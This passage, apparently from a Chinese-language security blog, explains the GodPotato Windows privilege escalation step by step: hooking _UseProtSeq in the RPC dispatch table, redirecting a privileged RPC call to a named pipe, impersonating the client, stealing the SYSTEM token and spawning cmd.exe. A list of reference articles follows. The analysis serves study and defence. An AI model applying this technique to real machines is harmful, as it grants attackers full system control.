<li><strong>解析目标函数</strong>: 找到接口后，程序会进一步解析其定义，锁定一个名为 <code>_UseProtSeq</code>​ 的函数。此函数在DCOM中负责选择通信协议序列，是后续进行调用劫持的理想目标。</li>
</ol>
<h4><strong>关键函数挂钩 (</strong> _UseProtSeq <strong>)</strong></h4>
<p>这是实现调用劫持的核心步骤，通过在内存中修改函数指针，改变程序的执行流程。</p>
<ol>
<li><strong>创建代理函数</strong>: 利用C#的委托（Delegate）机制，创建一个与原始 <code>_UseProtSeq</code>​ 函数具有完全相同签名（参数列表、返回值类型）的代理函数。所有恶意的重定向逻辑都将在这个代理函数中实现。</li>
<li><strong>修改RPC调度表</strong>: 程序调用 <code>VirtualProtect</code>​ API来获取目标内存区域（RPC调度表）的写权限。随后，通过 <code>Marshal.WriteIntPtr</code>​ 等方法，将调度表中记录的原始 <code>_UseProtSeq</code>​ 函数地址，强行覆盖为我们创建的代理函数的入口地址。</li>
<li><strong>完成劫持</strong>: 经过此步骤，任何高权限服务（如 <code>RPCSS</code>​）在后续的DCOM通信中对 <code>_UseProtSeq</code>​ 的正常调用，都将被重定向到我们的代理函数，从而落入攻击者的控制之下。</li>
</ol>
<h4><strong>RPC重定向与身份模拟</strong></h4>
<p>这是漏洞利用的触发和核心环节，将高权限的RPC调用引导至攻击者掌控的通道中。</p>
<ol>
<li><strong>创建命名管道 (Named Pipe)</strong> : 攻击者在本地 一个自定义的命名管道，例如 <code>\\.\pipe\GodPotato\pipe\epmapper</code>​。这个管道将作为接收重定向RPC调用的服务端。</li>
<li><strong>触发并重定向RPC调用</strong>: 当被挂钩的代理函数（<code>_UseProtSeq</code>​）被高权限服务调用时，它会中断原始的执行流，转而将该服务的RPC通信请求，强制重定向到上一步创建的命名管道。</li>
<li><strong>调用</strong> <code>ImpersonateNamedPipeClient</code>​: 作为命名管道的服务器，攻击者程序会接收到来自高权限服务的连接。在连接建立的瞬间，程序会立刻调用Windows API <code>ImpersonateNamedPipeClient</code>​。这是整个攻击链的精髓，该函数使得当前线程能够完全模拟（Impersonate）管道客户端（即高权限服务）的安全上下文。</li>
</ol>
<h4><strong>令牌窃取与进程创建</strong></h4>
<p>成功模拟身份后，最后一步就是利用这个临时的、高权限的身份来完成最终的提权。</p>
<ol>
<li><strong>获取高权限令牌 (Token)</strong> : 在<code>Impersonate</code>​成功后，当前线程便在操作系统的调度层面暂时拥有了 <code>SYSTEM</code>​ 权限。程序会立即从当前线程中提取其安全令牌（Access Token），这个令牌中包含了 <code>SYSTEM</code>​ 账户的所有权限信息。</li>
<li><strong>创建新进程</strong>: 最后，攻击者利用这个窃取到的 <code>SYSTEM</code>​ 令牌，调用 <code>CreateProcessAsUser</code>​ 或 <code>CreateProcessWithTokenW</code>​ 等API，以系统的最高权限创建一个新的进程，例如 <code>cmd.exe</code>​。</li>
</ol>
<p>详细的源码分析可以参考：<a href="https://holdyounger.github.io/2025/01/09/A_OS/Windows/RPC/%E3%80%90RPC%E3%80%91GodPotato%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/">【RPC】GodPotato 原理分析 - oone (holdyounger.github.io)</a></p>
<h2>其他参考文章</h2>
<p><a href="https://www.geekby.site/2020/08/potato%E5%AE%B6%E6%97%8F%E6%8F%90%E6%9D%83%E5%88%86%E6%9E%90/">Potato 家族提权分析 - Geekby's Blog</a></p>
<p><a href="https://hideandsec.sh/books/windows-sNL/page/in-the-potato-family-i-want-them-all">In the Potato family, ... | HideAndSec</a></p>
<p><a href="https://xz.aliyun.com/news/7371">Potato 家族本地提权细节-先知社区 (aliyun.com)</a></p>
<p><a href="https://forum.butian.net/share/860">奇安信攻防社区-Potato 提权合集 (butian.net)</a></p>
<p><a href="https://github.com/xf555er/RedTeamNotes/blob/master/%E5%9C%9F%E8%B1%86%E6%8F%90%E6%9D%83%E5%8E%9F%E7%90%86.md">RedTeamNotes/土豆提权原理.md at master · xf555er/RedTeamNotes (github.com)</a></p>
<p><a href="https://blog.z3ratu1.top/%E4%BB%8E%E7%83%82%E5%9C%9F%E8%B1%86%E5%BC%80%E5%A7%8B%E7%9A%84%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F%E5%85%A5%E9%97%A8.html">从烂土豆开始的土豆家族入门 | Z3ratu1's blog</a></p>
<p><a href="https://jlajara.gitlab.io/Potatoes_Windows_Privesc">Potatoes - Windows Privilege Escalation · Jorge Lajara Website (jlajara.gitlab.io)</a></p>
<p><a href="https://googleprojectzero.blogspot.com/2021/10/windows-exploitation-tricks-relaying.html">Project Zero：Windows 漏洞利用技巧：中继 DCOM 身份验证 (googleprojectzero.blogspot.com)</a></p>
